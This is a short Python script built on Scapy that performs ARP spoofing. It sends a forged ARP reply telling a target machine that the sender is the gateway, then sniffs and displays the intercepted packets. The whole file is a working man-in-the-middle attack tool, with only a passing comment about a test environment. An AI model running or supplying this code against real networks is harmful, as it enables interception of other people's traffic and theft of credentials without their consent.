from scapy.all import ARP, send, sniff

def send_arp_spoof(target_ip, spoof_ip, target_mac):
    """
    Send an ARP spoof packet.
    :param target_ip: The IP address of the target machine.
    :param spoof_ip: The IP address to impersonate.
    :param target_mac: The MAC address of the target machine.
    """
    # Constructing a fake ARP response
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)
    print(f"[+] Sent ARP spoof packet to {target_ip} claiming to be {spoof_ip}")

def intercept_traffic(filter_exp=""):
    """
    Intercept traffic using sniffing.
    :param filter_exp: Optional BPF (Berkeley Packet Filter) expression to filter packets.
    """
    print("[*] Starting to capture network traffic...")
    packets = sniff(filter=filter_exp, count=10)
    for pkt in packets:
        pkt.show()  # Display packet details
        print("-" * 40)

# Example usage
if __name__ == "__main__":
    # Replace the following with actual details for your test environment
    target_ip = "192.168.68.5"
    spoof_ip = "192.168.68.1"
    target_mac = "00:11:22:33:44:55"

    # ARP spoof the target
    send_arp_spoof(target_ip, spoof_ip, target_mac)

    # Start capturing traffic
    intercept_traffic()